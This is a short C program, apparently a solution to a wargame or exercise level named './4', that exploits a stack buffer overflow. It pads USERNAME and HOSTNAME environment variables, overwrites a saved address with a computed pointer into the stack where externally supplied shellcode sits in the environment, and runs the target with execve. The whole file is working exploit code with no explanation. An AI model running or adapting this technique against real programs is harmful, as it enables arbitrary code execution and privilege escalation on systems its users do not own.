#include <string.h>
#include <unistd.h>
#define PROGNAME "./4"
extern char shellcode[];
int main(void){
	char user[49]="USERNAME=";
	char hostname[89]="HOSTNAME=";
	char *argv[]={PROGNAME,NULL};
	long addr=0x7ffffffff000 - 8 - (strlen(PROGNAME)+1) - (strlen(shellcode)+1);
	memset(user+9,'x',40);
	memset(hostname+9,'x',80);
	*(long*)(hostname+62)=addr;
	//host[62-1]=0;
	char *envp[]={user,hostname,shellcode,NULL};
	execve(PROGNAME,argv,envp);
	return 1;
}

